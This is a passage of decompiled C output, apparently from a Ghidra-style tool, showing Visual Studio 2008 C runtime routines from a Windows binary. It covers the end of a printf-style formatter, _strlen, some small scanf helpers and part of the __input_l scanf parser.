                if (((local_214 & 0x8000) == 0) && ((local_214 & 0x1000) == 0)) {
                  local_228 = (int **)((int)_ArgList + 4);
                  if ((local_214 & 0x20) == 0) {
                    piVar3 = *(int **)_ArgList;
                    if ((local_214 & 0x40) == 0) {
                      piVar6 = (int *)0x0;
                    }
                    else {
                      piVar6 = (int *)((int)piVar3 >> 0x1f);
                    }
                  }
                  else {
                    if ((local_214 & 0x40) == 0) {
                      piVar3 = (int *)(uint)*(ushort *)_ArgList;
                    }
                    else {
                      piVar3 = (int *)(int)*(short *)_ArgList;
                    }
                    piVar6 = (int *)((int)piVar3 >> 0x1f);
                  }
                }
                else {
                  piVar3 = *(int **)_ArgList;
                  piVar6 = *(int **)((int)_ArgList + 4);
                  local_228 = (int **)((int)_ArgList + 8);
                }
                if ((((local_214 & 0x40) != 0) && ((int)piVar6 < 1)) && ((int)piVar6 < 0)) {
                  bVar12 = piVar3 != (int *)0x0;
                  piVar3 = (int *)-(int)piVar3;
                  piVar6 = (int *)-(int)((int)piVar6 + (uint)bVar12);
                  local_214 = local_214 | 0x100;
                }
                uVar13 = CONCAT44(piVar6,piVar3);
                if ((local_214 & 0x9000) == 0) {
                  piVar6 = (int *)0x0;
                }
                if ((int)local_21c < 0) {
                  local_21c = (int *)0x1;
                }
                else {
                  local_214 = local_214 & 0xfffffff7;
                  if (0x200 < (int)local_21c) {
                    local_21c = (int *)0x200;
                  }
                }
                if (((uint)piVar3 | (uint)piVar6) == 0) {
                  local_234 = 0;
                }
                piVar3 = (int *)local_11;
                while( true ) {
                  piVar15 = piVar6;
                  piVar6 = (int *)((int)local_21c + -1);
                  if (((int)local_21c < 1) && (((uint)uVar13 | (uint)piVar15) == 0)) break;
                  local_21c = piVar6;
                  uVar13 = __aulldvrm((uint)uVar13,(uint)piVar15,(uint)local_224,
                                      (int)local_224 >> 0x1f);
                  iVar8 = extraout_ECX + 0x30;
                  if (0x39 < iVar8) {
                    iVar8 = iVar8 + local_24c;
                  }
                  *(char *)piVar3 = (char)iVar8;
                  piVar3 = (int *)((int)piVar3 + -1);
                  piVar6 = (int *)((ulonglong)uVar13 >> 0x20);
                  local_264 = piVar15;
                }
                local_224 = (int *)(local_11 + -(int)piVar3);
                local_220 = (int *)((int)piVar3 + 1);
                local_21c = piVar6;
                if (((local_214 & 0x200) != 0) &&
                   ((local_224 == (int *)0x0 || (*(char *)local_220 != '0')))) {
                  *(char *)piVar3 = '0';
                  local_224 = (int *)(local_11 + -(int)piVar3 + 1);
                  local_220 = piVar3;
                }
              }
              else if ((char)local_215 < 'T') {
                if (local_215 == 0x53) {
                  if ((local_214 & 0x830) == 0) {
                    local_214 = local_214 | 0x800;
                  }
                  goto LAB_00419fc9;
                }
                if (local_215 == 0x41) {
LAB_00419f48:
                  local_215 = local_215 + 0x20;
                  local_274 = 1;
LAB_00419f5b:
                  local_214 = local_214 | 0x40;
                  local_264 = (int *)0x200;
                  piVar6 = local_210;
                  piVar3 = local_264;
                  piVar15 = local_210;
                  if ((int)local_21c < 0) {
                    local_21c = (int *)0x6;
                  }
                  else if (local_21c == (int *)0x0) {
                    if (local_215 == 0x67) {
                      local_21c = (int *)0x1;
                    }
                  }
                  else {
                    if (0x200 < (int)local_21c) {
                      local_21c = (int *)0x200;
                    }
                    if (0xa3 < (int)local_21c) {
                      piVar3 = (int *)((int)local_21c + 0x15d);
                      local_220 = local_210;
                      local_248 = (int *)__malloc_crt((size_t)piVar3);
                      piVar6 = local_248;
                      piVar15 = local_248;
                      if (local_248 == (int *)0x0) {
                        local_21c = (int *)0xa3;
                        piVar6 = local_210;
                        piVar3 = local_264;
                        piVar15 = local_220;
                      }
                    }
                  }
                  local_220 = piVar15;
                  local_264 = piVar3;
                  local_27c = *(int **)_ArgList;
                  local_228 = (int **)((int)_ArgList + 8);
                  local_278 = *(int **)((int)_ArgList + 4);
                  plVar18 = &local_260;
                  iVar8 = (int)(char)local_215;
                  ppiVar14 = &local_27c;
                  piVar3 = piVar6;
                  piVar15 = local_264;
                  piVar16 = local_21c;
                  uVar17 = local_274;
                  pcVar5 = (code *)__decode_pointer((int)PTR_LAB_0042be4c);
                  (*pcVar5)(ppiVar14,piVar3,piVar15,iVar8,piVar16,uVar17,plVar18);
                  uVar4 = local_214 & 0x80;
                  if ((uVar4 != 0) && (local_21c == (int *)0x0)) {
                    plVar18 = &local_260;
                    piVar3 = piVar6;
                    pcVar5 = (code *)__decode_pointer((int)PTR_LAB_0042be58);
                    (*pcVar5)(piVar3,plVar18);
                  }
                  if ((local_215 == 0x67) && (uVar4 == 0)) {
                    plVar18 = &local_260;
                    piVar3 = piVar6;
                    pcVar5 = (code *)__decode_pointer((int)PTR_LAB_0042be54);
                    (*pcVar5)(piVar3,plVar18);
                  }
                  if (*(char *)piVar6 == '-') {
                    local_214 = local_214 | 0x100;
                    local_220 = (int *)((int)piVar6 + 1);
                    piVar6 = local_220;
                  }
LAB_0041a0fb:
                  local_224 = (int *)_strlen((char *)piVar6);
                }
                else if (local_215 == 0x43) {
                  if ((local_214 & 0x830) == 0) {
                    local_214 = local_214 | 0x800;
                  }
LAB_0041a03c:
                  local_228 = (int **)((int)_ArgList + 4);
                  if ((local_214 & 0x810) == 0) {
                    local_210[0]._0_1_ = *_ArgList;
                    local_224 = (int *)0x1;
                  }
                  else {
                    eVar7 = _wctomb_s((int *)&local_224,(char *)local_210,0x200,*(wchar_t *)_ArgList
                                     );
                    if (eVar7 != 0) {
                      local_244 = 1;
                    }
                  }
                  local_220 = local_210;
                }
                else if ((local_215 == 0x45) || (local_215 == 0x47)) goto LAB_00419f48;
              }
              else {
                if (local_215 == 0x58) goto LAB_0041a302;
                if (local_215 == 0x5a) {
                  piVar3 = *(int **)_ArgList;
                  local_228 = (int **)((int)_ArgList + 4);
                  piVar6 = (int *)PTR_s__null__0042be5c;
                  local_220 = (int *)PTR_s__null__0042be5c;
                  if ((piVar3 == (int *)0x0) || (piVar15 = (int *)piVar3[1], piVar15 == (int *)0x0))
                  goto LAB_0041a0fb;
                  local_224 = (int *)(int)*(wchar_t *)piVar3;
                  local_220 = piVar15;
                  if ((local_214 & 0x800) == 0) {
                    local_23c = 0;
                  }
                  else {
                    local_224 = (int *)((int)local_224 / 2);
                    local_23c = 1;
                  }
                }
                else {
                  if (local_215 == 0x61) goto LAB_00419f5b;
                  if (local_215 == 99) goto LAB_0041a03c;
                }
              }
LAB_0041a4da:
              if (local_244 == 0) {
                if ((local_214 & 0x40) != 0) {
                  if ((local_214 & 0x100) == 0) {
                    if ((local_214 & 1) == 0) {
                      if ((local_214 & 2) == 0) goto LAB_0041a523;
                      local_230 = 0x20;
                    }
                    else {
                      local_230 = 0x2b;
                    }
                  }
                  else {
                    local_230 = 0x2d;
                  }
                  local_234 = 1;
                }
LAB_0041a523:
                pcVar11 = (char *)((int)local_238 + (-local_234 - (int)local_224));
                if ((local_214 & 0xc) == 0) {
                  _write_multi_char(0x20,(int)pcVar11,local_250);
                }
                pFVar2 = local_250;
                _write_string(local_234);
                if (((local_214 & 8) != 0) && ((local_214 & 4) == 0)) {
                  _write_multi_char(0x30,(int)pcVar11,pFVar2);
                }
                if ((local_23c == 0) || ((int)local_224 < 1)) {
                  _write_string((int)local_224);
                }
                else {
                  local_264 = local_224;
                  piVar3 = local_220;
                  do {
                    _WCh = *(wchar_t *)piVar3;
                    local_264 = (int *)((int)local_264 + -1);
                    piVar3 = (int *)((int)piVar3 + 2);
                    eVar7 = _wctomb_s(local_26c,local_11 + 1,6,_WCh);
                    if ((eVar7 != 0) || (local_26c[0] == 0)) {
                      local_22c = -1;
                      break;
                    }
                    _write_string(local_26c[0]);
                  } while (local_264 != (int *)0x0);
                }
                if ((-1 < local_22c) && ((local_214 & 4) != 0)) {
                  _write_multi_char(0x20,(int)pcVar11,pFVar2);
                }
              }
            }
            else {
              if ('p' < (char)local_215) {
                if (local_215 == 0x73) {
LAB_00419fc9:
                  piVar3 = local_21c;
                  if (local_21c == (int *)0xffffffff) {
                    piVar3 = (int *)0x7fffffff;
                  }
                  local_228 = (int **)((int)_ArgList + 4);
                  local_220 = *(int **)_ArgList;
                  if ((local_214 & 0x810) == 0) {
                    local_224 = local_220;
                    if (local_220 == (int *)0x0) {
                      local_224 = (int *)PTR_s__null__0042be5c;
                      local_220 = (int *)PTR_s__null__0042be5c;
                    }
                    for (; (piVar3 != (int *)0x0 &&
                           (piVar3 = (int *)((int)piVar3 + -1), *(char *)local_224 != '\0'));
                        local_224 = (int *)((int)local_224 + 1)) {
                    }
                    local_224 = (int *)((int)local_224 - (int)local_220);
                  }
                  else {
                    if (local_220 == (int *)0x0) {
                      local_220 = (int *)PTR_u__null__0042be60;
                    }
                    local_23c = 1;
                    for (piVar6 = local_220;
                        (piVar3 != (int *)0x0 &&
                        (piVar3 = (int *)((int)piVar3 + -1), *(wchar_t *)piVar6 != L'\0'));
                        piVar6 = (int *)((int)piVar6 + 2)) {
                    }
                    local_224 = (int *)((int)piVar6 - (int)local_220 >> 1);
                  }
                  goto LAB_0041a4da;
                }
                if (local_215 == 0x75) goto LAB_0041a1a4;
                if (local_215 != 0x78) goto LAB_0041a4da;
                local_24c = 0x27;
LAB_0041a32e:
                local_224 = (int *)0x10;
                if ((local_214 & 0x80) != 0) {
                  local_22f = (char)local_24c + 'Q';
                  local_230 = 0x30;
                  local_234 = 2;
                }
                goto LAB_0041a1ae;
              }
              if (local_215 == 0x70) {
                local_21c = (int *)0x8;
LAB_0041a302:
                local_24c = 7;
                goto LAB_0041a32e;
              }
              if ((char)local_215 < 'e') goto LAB_0041a4da;
              if ((char)local_215 < 'h') goto LAB_00419f5b;
              if (local_215 == 0x69) goto LAB_0041a19d;
              if (local_215 != 0x6e) {
                if (local_215 != 0x6f) goto LAB_0041a4da;
                local_224 = (int *)0x8;
                if ((local_214 & 0x80) != 0) {
                  local_214 = local_214 | 0x200;
                }
                goto LAB_0041a1ae;
              }
              piVar3 = *(int **)_ArgList;
              local_228 = (int **)((int)_ArgList + 4);
              iVar8 = __get_printf_count_output();
              if (iVar8 == 0) goto LAB_00419ba0;
              if ((local_214 & 0x20) == 0) {
                *piVar3 = local_22c;
              }
              else {
                *(wchar_t *)piVar3 = (wchar_t)local_22c;
              }
              local_244 = 1;
            }
            if (local_248 != (int *)0x0) {
              _free(local_248);
              local_248 = (int *)0x0;
            }
          }
          local_215 = *local_240;
          iVar8 = local_270;
          _Format = (char *)local_240;
          _ArgList = (va_list)local_228;
        }
        if (local_254 != '\0') {
          *(uint *)(local_258 + 0x70) = *(uint *)(local_258 + 0x70) & 0xfffffffd;
        }
        goto LAB_0041a69d;
      }
    }
  }
LAB_00419ba0:
  piVar3 = __errno();
  *piVar3 = 0x16;
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  if (local_254 != '\0') {
    *(uint *)(local_258 + 0x70) = *(uint *)(local_258 + 0x70) & 0xfffffffd;
  }
LAB_0041a69d:
  iVar8 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return iVar8;
}



// Library Function - Single Match
//  _strlen
// 
// Library: Visual Studio

size_t __cdecl _strlen(char *_Str)

{
  char cVar1;
  uint uVar2;
  uint *puVar3;
  uint *puVar4;
  
  uVar2 = (uint)_Str & 3;
  puVar3 = (uint *)_Str;
  while (uVar2 != 0) {
    cVar1 = *(char *)puVar3;
    puVar3 = (uint *)((int)puVar3 + 1);
    if (cVar1 == '\0') goto LAB_0041a7d3;
    uVar2 = (uint)puVar3 & 3;
  }
  do {
    do {
      puVar4 = puVar3;
      puVar3 = puVar4 + 1;
    } while (((*puVar4 ^ 0xffffffff ^ *puVar4 + 0x7efefeff) & 0x81010100) == 0);
    uVar2 = *puVar4;
    if ((char)uVar2 == '\0') {
      return (int)puVar4 - (int)_Str;
    }
    if ((char)(uVar2 >> 8) == '\0') {
      return (size_t)((int)puVar4 + (1 - (int)_Str));
    }
    if ((uVar2 & 0xff0000) == 0) {
      return (size_t)((int)puVar4 + (2 - (int)_Str));
    }
  } while ((uVar2 & 0xff000000) != 0);
LAB_0041a7d3:
  return (size_t)((int)puVar3 + (-1 - (int)_Str));
}



// Library Function - Single Match
//  ___check_float_string
// 
// Library: Visual Studio 2008 Release

undefined4 __cdecl ___check_float_string(size_t param_1,void *param_2,undefined4 *param_3)

{
  size_t _Count;
  void *pvVar1;
  size_t *unaff_ESI;
  void **unaff_EDI;
  
  _Count = *unaff_ESI;
  if (param_1 == _Count) {
    if (*unaff_EDI == param_2) {
      pvVar1 = __calloc_crt(_Count,2);
      *unaff_EDI = pvVar1;
      if (pvVar1 == (void *)0x0) {
        return 0;
      }
      *param_3 = 1;
      _memcpy(*unaff_EDI,param_2,*unaff_ESI);
    }
    else {
      pvVar1 = __recalloc_crt(*unaff_EDI,_Count,2);
      if (pvVar1 == (void *)0x0) {
        return 0;
      }
      *unaff_EDI = pvVar1;
    }
    *unaff_ESI = *unaff_ESI << 1;
  }
  return 1;
}



// Library Function - Single Match
//  __hextodec
// 
// Library: Visual Studio 2008 Release

uint __cdecl __hextodec(byte param_1)

{
  int iVar1;
  uint uVar2;
  
  iVar1 = _isdigit((uint)param_1);
  uVar2 = (uint)(char)param_1;
  if (iVar1 == 0) {
    uVar2 = (uVar2 & 0xffffffdf) - 7;
  }
  return uVar2;
}



// Library Function - Single Match
//  __inc
// 
// Library: Visual Studio 2008 Release

uint __fastcall __inc(undefined4 param_1,FILE *param_2)

{
  int *piVar1;
  byte bVar2;
  uint uVar3;
  
  piVar1 = &param_2->_cnt;
  *piVar1 = *piVar1 + -1;
  if (-1 < *piVar1) {
    bVar2 = *param_2->_ptr;
    param_2->_ptr = param_2->_ptr + 1;
    return (uint)bVar2;
  }
  uVar3 = __filbuf(param_2);
  return uVar3;
}



// Library Function - Single Match
//  __un_inc
// 
// Library: Visual Studio 2008 Release

void __cdecl __un_inc(int param_1,FILE *param_2)

{
  if (param_1 != -1) {
    __ungetc_nolock(param_1,param_2);
    return;
  }
  return;
}



// Library Function - Single Match
//  __whiteout
// 
// Library: Visual Studio 2008 Release

uint __thiscall __whiteout(void *this,FILE *param_1)

{
  uint uVar1;
  int iVar2;
  int *unaff_ESI;
  
  do {
    *unaff_ESI = *unaff_ESI + 1;
    uVar1 = __inc(this,param_1);
    if (uVar1 == 0xffffffff) {
      return 0xffffffff;
    }
    this = (void *)(uVar1 & 0xff);
    iVar2 = _isspace((int)this);
  } while (iVar2 != 0);
  return uVar1;
}



// Library Function - Single Match
//  __input_l
// 
// Library: Visual Studio 2008 Release

int __cdecl __input_l(FILE *_File,uchar *param_2,_locale_t _Locale,va_list _ArgList)

{
  byte bVar1;
  byte bVar2;
  int *piVar3;
  uint uVar4;
  void *pvVar5;
  code *pcVar6;
  int iVar7;
  undefined *puVar8;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 extraout_ECX_01;
  undefined4 extraout_ECX_02;
  undefined4 extraout_ECX_03;
  undefined4 uVar9;
  undefined4 extraout_ECX_04;
  FILE *extraout_ECX_05;
  FILE *pFVar10;
  FILE *extraout_ECX_06;
  int extraout_ECX_07;
  undefined4 extraout_ECX_08;
  uint extraout_ECX_09;
  byte bVar11;
  uint uVar12;
  char cVar13;
  void *_C;
  size_t sVar14;
  size_t sVar15;
  byte *pbVar16;
  undefined4 *puVar17;
  byte *pbVar18;
  bool bVar19;
  longlong lVar20;
  FILE *pFVar21;
  localeinfo_struct *plVar22;
  undefined4 *local_200;
  localeinfo_struct local_1fc;
  int local_1f4;
  char local_1f0;
  undefined4 local_1ec;
  undefined4 *local_1e8;
  byte local_1e4;
  undefined local_1e3;
  undefined4 local_1e0;
  int local_1dc;
  byte local_1d5;
  int local_1d4;
  undefined8 local_1d0;
  int local_1c8;
  undefined4 *local_1c4;
  undefined4 *local_1c0;
  byte *local_1bc;
  int local_1b8;
  char local_1b1;
  undefined *local_1b0;
  int local_1ac;
  uint local_1a8;
  char local_1a4;
  byte local_1a3;
  char local_1a2;
  char local_1a1;
  FILE *local_1a0;
  char local_19a;
  char local_199;
  int local_198;
  char local_191;
  undefined4 *local_190;
  uint local_18c;
  undefined local_188 [352];
  byte local_28 [32];
  uint local_8;
  
  local_8 = DAT_0042b0a0 ^ (uint)&stack0xfffffffc;
  local_1e8 = (undefined4 *)_ArgList;
  local_1b0 = local_188;
  local_1a0 = _File;
  local_1e0 = 0x15e;
  local_1d4 = 0;
  local_1ec = 0;
  local_18c = 0;
  if ((param_2 == (uchar *)0x0) || (_File == (FILE *)0x0)) {
    piVar3 = __errno();
    *piVar3 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    goto LAB_0041b874;
  }
  if ((*(byte *)&_File->_flag & 0x40) == 0) {
    uVar4 = __fileno(_File);
    if ((uVar4 == 0xffffffff) || (uVar4 == 0xfffffffe)) {
      puVar8 = &DAT_0042b798;
    }
    else {
      puVar8 = (undefined *)((uVar4 & 0x1f) * 0x40 + (&DAT_0046eb40)[(int)uVar4 >> 5]);
    }
    if ((puVar8[0x24] & 0x7f) == 0) {
      if ((uVar4 == 0xffffffff) || (uVar4 == 0xfffffffe)) {
        puVar8 = &DAT_0042b798;
      }
      else {
        puVar8 = (undefined *)((uVar4 & 0x1f) * 0x40 + (&DAT_0046eb40)[(int)uVar4 >> 5]);
      }
      if ((puVar8[0x24] & 0x80) == 0) goto LAB_0041a9c4;
    }
    piVar3 = __errno();
    *piVar3 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    goto LAB_0041b874;
  }
LAB_0041a9c4:
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_1fc,_Locale);
  bVar1 = *param_2;
  local_1a1 = '\0';
  local_190 = (undefined4 *)0x0;
  local_1c8 = 0;
  if (bVar1 != 0) {
LAB_0041a9ef:
    pFVar21 = local_1a0;
    pvVar5 = (void *)(uint)bVar1;
    iVar7 = _isspace((int)pvVar5);
    if (iVar7 != 0) {
      local_190 = (undefined4 *)((int)local_190 + -1);
      uVar4 = __whiteout(pvVar5,pFVar21);
      __un_inc(uVar4,pFVar21);
      do {
        param_2 = param_2 + 1;
        iVar7 = _isspace((uint)*param_2);
      } while (iVar7 != 0);
      goto LAB_0041b7dc;
    }
    if (*param_2 == 0x25) {
      if (param_2[1] == 0x25) {
        if (param_2[1] == 0x25) {
          param_2 = param_2 + 1;
        }
        goto LAB_0041b76e;
      }
      local_1c4 = (undefined4 *)0x0;
      local_1d5 = 0;
      local_1ac = 0;
      local_1b8 = 0;
      local_198 = 0;
      local_1a3 = 0;
      local_1a4 = '\0';
      local_19a = '\0';
      local_1b1 = '\0';
      local_1a2 = '\0';
      local_191 = '\0';
      local_199 = '\x01';
      local_1dc = 0;
      do {
        pbVar16 = param_2 + 1;
        _C = (void *)(uint)*pbVar16;
        pvVar5 = _C;
        iVar7 = _isdigit((int)_C);
        pbVar18 = pbVar16;
        if (iVar7 == 0) {
          if (_C < (void *)0x4f) {
            if (_C != (void *)0x4e) {
              if (_C == (void *)0x2a) {
                local_19a = local_19a + '\x01';
              }
              else if (_C != (void *)0x46) {
                if (_C == (void *)0x49) {
                  bVar1 = param_2[2];
                  pvVar5 = (void *)CONCAT31((int3)((uint)pvVar5 >> 8),bVar1);
                  if ((bVar1 == 0x36) && (pbVar18 = param_2 + 3, *pbVar18 == 0x34))
                  goto LAB_0041ab10;
                  if ((((((bVar1 != 0x33) || (pbVar18 = param_2 + 3, *pbVar18 != 0x32)) &&
                        (pbVar18 = pbVar16, bVar1 != 100)) && ((bVar1 != 0x69 && (bVar1 != 0x6f))))
                      && (bVar1 != 0x78)) && (bVar1 != 0x58)) goto LAB_0041ab69;
                }
                else if (_C == (void *)0x4c) {
                  local_199 = local_199 + '\x01';
                }
                else {
LAB_0041ab69:
                  local_1b1 = local_1b1 + '\x01';
                  pbVar18 = pbVar16;
                }
              }
            }
          }
          else if (_C == (void *)0x68) {
            local_199 = local_199 + -1;
            local_191 = local_191 + -1;
          }
          else {
            if (_C == (void *)0x6c) {
              pbVar18 = param_2 + 2;
              if (*pbVar18 == 0x6c) {
LAB_0041ab10:
                local_1dc = local_1dc + 1;
                local_1d0 = 0;
                goto LAB_0041ab93;
              }
              local_199 = local_199 + '\x01';
            }
            else if (_C != (void *)0x77) goto LAB_0041ab69;
            local_191 = local_191 + '\x01';
            pbVar18 = pbVar16;
          }
        }
        else {
          local_1b8 = local_1b8 + 1;
          local_198 = local_198 * 10 + -0x30 + (int)_C;
        }
LAB_0041ab93:
        param_2 = pbVar18;
      } while (local_1b1 == '\0');
      if (local_19a == '\0') {
        local_1c0 = (undefined4 *)*local_1e8;
        local_200 = local_1e8;
        local_1e8 = local_1e8 + 1;
      }
      else {
        local_1c0 = (undefined4 *)0x0;
      }
      cVar13 = '\0';
      if ((local_191 == '\0') && ((*pbVar18 == 0x53 || (local_191 = -1, *pbVar18 == 0x43)))) {
        local_191 = '\x01';
      }
      local_1a8 = *pbVar18 | 0x20;
      local_1bc = pbVar18;
      if (local_1a8 != 0x6e) {
        if ((local_1a8 == 99) || (local_1a8 == 0x7b)) {
          local_190 = (undefined4 *)((int)local_190 + 1);
          local_18c = __inc(pvVar5,local_1a0);
        }
        else {
          local_18c = __whiteout(pvVar5,local_1a0);
        }
        if (local_18c == 0xffffffff) goto LAB_0041b812;
      }
      pFVar21 = local_1a0;
      if ((local_1b8 != 0) && (local_198 == 0)) goto LAB_0041b7f4;
      if ((int)local_1a8 < 0x70) {
        if (local_1a8 == 0x6f) {
LAB_0041b47a:
          if (local_18c == 0x2d) {
            local_1a4 = '\x01';
          }
          else if (local_18c != 0x2b) goto LAB_0041b4bc;
          local_198 = local_198 + -1;
          if ((local_198 == 0) && (local_1b8 != 0)) {
            cVar13 = '\x01';
          }
          else {
            local_190 = (undefined4 *)((int)local_190 + 1);
            local_18c = __inc(local_1b8,local_1a0);
          }
          goto LAB_0041b4bc;
        }
        if (local_1a8 == 99) {
          if (local_1b8 == 0) {
            local_198 = local_198 + 1;
            local_1b8 = 1;
          }
LAB_0041b0a0:
          if ('\0' < local_191) {
            local_1a2 = '\x01';
          }
LAB_0041b0b0:
          pFVar21 = local_1a0;
          puVar17 = local_1c0;
          local_190 = (undefined4 *)((int)local_190 + -1);
          pFVar10 = local_1a0;
          local_1c4 = local_1c0;
          __un_inc(local_18c,local_1a0);
          do {
            if ((local_1b8 != 0) &&
               (iVar7 = local_198 + -1, bVar19 = local_198 == 0, local_198 = iVar7, bVar19))
            goto LAB_0041b420;
            local_190 = (undefined4 *)((int)local_190 + 1);
            local_18c = __inc(pFVar10,pFVar21);
            if (local_18c == 0xffffffff) goto LAB_0041b411;
            bVar1 = (byte)local_18c;
            pFVar10 = extraout_ECX_05;
            if (local_1a8 != 99) {
              if (local_1a8 == 0x73) {
                if ((8 < (int)local_18c) && ((int)local_18c < 0xe)) goto LAB_0041b411;
                if (local_18c != 0x20) goto LAB_0041b160;
              }
              if ((local_1a8 != 0x7b) ||
                 (pFVar10 = (FILE *)(int)(char)(local_28[(int)local_18c >> 3] ^ local_1a3),
                 ((uint)pFVar10 & 1 << (bVar1 & 7)) == 0)) goto LAB_0041b411;
            }
LAB_0041b160:
            if (local_19a == '\0') {
              if (local_1a2 == '\0') {
                *(byte *)puVar17 = bVar1;
                puVar17 = (undefined4 *)((int)puVar17 + 1);
                local_1c0 = puVar17;
              }
              else {
                uVar4 = local_18c & 0xff;
                local_1e4 = bVar1;
                iVar7 = _isleadbyte(uVar4);
                if (iVar7 != 0) {
                  local_190 = (undefined4 *)((int)local_190 + 1);
                  uVar4 = __inc(uVar4,pFVar21);
                  local_1e3 = (undefined)uVar4;
                }
                local_1ec = 0x3f;
                __mbtowc_l((wchar_t *)&local_1ec,(char *)&local_1e4,
                           (size_t)(local_1fc.locinfo)->locale_name[3],&local_1fc);
                *(undefined2 *)puVar17 = (undefined2)local_1ec;
                puVar17 = (undefined4 *)((int)puVar17 + 2);
                pFVar10 = extraout_ECX_06;
                local_1c0 = puVar17;
              }
            }
            else {
              local_1c4 = (undefined4 *)((int)local_1c4 + 1);
            }
          } while( true );
        }
        if (local_1a8 == 100) goto LAB_0041b47a;
        if ((int)local_1a8 < 0x65) {
LAB_0041b20d:
          if (*local_1bc != local_18c) goto LAB_0041b7f4;
          local_1a1 = local_1a1 + -1;
          if (local_19a == '\0') {
            local_1e8 = local_200;
          }
          goto LAB_0041b74b;
        }
        if (0x67 < (int)local_1a8) {
          if (local_1a8 == 0x69) {
            local_1a8 = 100;
            goto LAB_0041acc4;
          }
          if (local_1a8 != 0x6e) goto LAB_0041b20d;
          puVar17 = local_190;
          if (local_19a != '\0') goto LAB_0041b74b;
          goto LAB_0041b71f;
        }
        sVar14 = 0;
        if (local_18c == 0x2d) {
          *local_1b0 = 0x2d;
          sVar14 = 1;
LAB_0041acfd:
          local_198 = local_198 + -1;
          local_190 = (undefined4 *)((int)local_190 + 1);
          local_18c = __inc(local_1b8,local_1a0);
        }
        else if (local_18c == 0x2b) goto LAB_0041acfd;
        if (local_1b8 == 0) {
          local_198 = -1;
        }
        while( true ) {
          uVar4 = local_18c & 0xff;
          iVar7 = _isdigit(uVar4);
          if ((iVar7 == 0) ||
             (iVar7 = local_198 + -1, bVar19 = local_198 == 0, local_198 = iVar7, bVar19)) break;
          local_1ac = local_1ac + 1;
          local_1b0[sVar14] = (byte)local_18c;
          sVar14 = sVar14 + 1;
          iVar7 = ___check_float_string(sVar14,local_188,&local_1d4);
          if (iVar7 == 0) goto LAB_0041b812;
          local_190 = (undefined4 *)((int)local_190 + 1);
          local_18c = __inc(extraout_ECX,local_1a0);
        }
        local_1a3 = **(byte **)local_1fc.locinfo[1].lc_codepage;
        if ((local_1a3 == (byte)local_18c) &&
           (iVar7 = local_198 + -1, bVar19 = local_198 != 0, local_198 = iVar7, bVar19)) {
          local_190 = (undefined4 *)((int)local_190 + 1);
          local_18c = __inc(uVar4,local_1a0);
          local_1b0[sVar14] = local_1a3;
          sVar14 = sVar14 + 1;
          iVar7 = ___check_float_string(sVar14,local_188,&local_1d4);
          if (iVar7 == 0) goto LAB_0041b812;
          while ((iVar7 = _isdigit(local_18c & 0xff), iVar7 != 0 &&
                 (iVar7 = local_198 + -1, bVar19 = local_198 != 0, local_198 = iVar7, bVar19))) {
            local_1ac = local_1ac + 1;
            local_1b0[sVar14] = (byte)local_18c;
            sVar14 = sVar14 + 1;
            iVar7 = ___check_float_string(sVar14,local_188,&local_1d4);
            if (iVar7 == 0) goto LAB_0041b812;
            local_190 = (undefined4 *)((int)local_190 + 1);
            local_18c = __inc(extraout_ECX_00,local_1a0);
          }
        }
        sVar15 = sVar14;
        if ((local_1ac != 0) &&
           (((local_18c == 0x65 || (local_18c == 0x45)) &&
            (iVar7 = local_198 + -1, bVar19 = local_198 != 0, local_198 = iVar7, bVar19)))) {
          local_1b0[sVar14] = 0x65;
          sVar15 = sVar14 + 1;
          iVar7 = ___check_float_string(sVar15,local_188,&local_1d4);
          if (iVar7 == 0) goto LAB_0041b812;
          local_190 = (undefined4 *)((int)local_190 + 1);
          local_18c = __inc(extraout_ECX_01,local_1a0);
          if (local_18c == 0x2d) {
            local_1b0[sVar15] = 0x2d;
            sVar15 = sVar14 + 2;
            iVar7 = ___check_float_string(sVar15,local_188,&local_1d4);
            uVar9 = extraout_ECX_03;
            if (iVar7 == 0) goto LAB_0041b812;
LAB_0041af6e:
            if (local_198 == 0) {
              local_198 = 0;
            }
            else {
              local_190 = (undefined4 *)((int)local_190 + 1);
              local_198 = local_198 + -1;
              local_18c = __inc(uVar9,local_1a0);
            }
          }
          else {
            uVar9 = extraout_ECX_02;
            if (local_18c == 0x2b) goto LAB_0041af6e;
          }
          while ((iVar7 = _isdigit(local_18c & 0xff), iVar7 != 0 &&
                 (iVar7 = local_198 + -1, bVar19 = local_198 != 0, local_198 = iVar7, bVar19))) {
            local_1ac = local_1ac + 1;
            local_1b0[sVar15] = (byte)local_18c;
            sVar15 = sVar15 + 1;
            iVar7 = ___check_float_string(sVar15,local_188,&local_1d4);
            if (iVar7 == 0) goto LAB_0041b812;
            local_190 = (undefined4 *)((int)local_190 + 1);
            local_18c = __inc(extraout_ECX_04,local_1a0);
          }
        }
        local_190 = (undefined4 *)((int)local_190 + -1);
        __un_inc(local_18c,local_1a0);
        if (local_1ac != 0) {
          if (local_19a == '\0') {
            local_1c8 = local_1c8 + 1;
            plVar22 = &local_1fc;
            local_1b0[sVar15] = 0;
            iVar7 = local_199 + -1;
            puVar17 = local_1c0;
            puVar8 = local_1b0;
            pcVar6 = (code *)__decode_pointer((int)PTR_LAB_0042be50);
            (*pcVar6)(iVar7,puVar17,puVar8,plVar22);
          }
          goto LAB_0041b74b;
        }
        goto LAB_0041b812;
      }
      if (local_1a8 == 0x70) {
        local_199 = '\x01';
        goto LAB_0041b47a;
      }
      if (local_1a8 == 0x73) goto LAB_0041b0a0;
      if (local_1a8 == 0x75) goto LAB_0041b47a;
      if (local_1a8 != 0x78) {
        if (local_1a8 == 0x7b) {
          if ('\0' < local_191) {
            local_1a2 = '\x01';
          }
          pbVar18 = local_1bc + 1;
          if (*pbVar18 == 0x5e) {
            pbVar18 = local_1bc + 2;
            local_1a3 = 0xff;
          }
          _memset(local_28,0,0x20);
          if (*pbVar18 == 0x5d) {
            local_28[11] = 0x20;
            uVar4 = 0x5d;
            pbVar18 = pbVar18 + 1;
          }
          else {
            uVar4 = (uint)local_1d5;
          }
          while( true ) {
            bVar1 = *pbVar18;
            local_1bc = pbVar18;
            if (bVar1 == 0x5d) break;
